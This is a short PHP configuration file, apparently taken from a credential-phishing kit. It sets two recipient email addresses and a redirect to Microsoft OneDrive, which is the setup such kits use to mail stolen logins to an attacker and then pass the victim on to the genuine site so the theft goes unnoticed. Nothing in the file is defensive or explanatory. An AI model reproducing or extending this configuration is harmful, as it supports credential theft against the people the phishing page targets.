<?php
$to  = 'skippadaflippa2019@gmail.com,skippadaflippa2019@protonmail.com';
$redirect = 'https://onedrive.live.com';
?>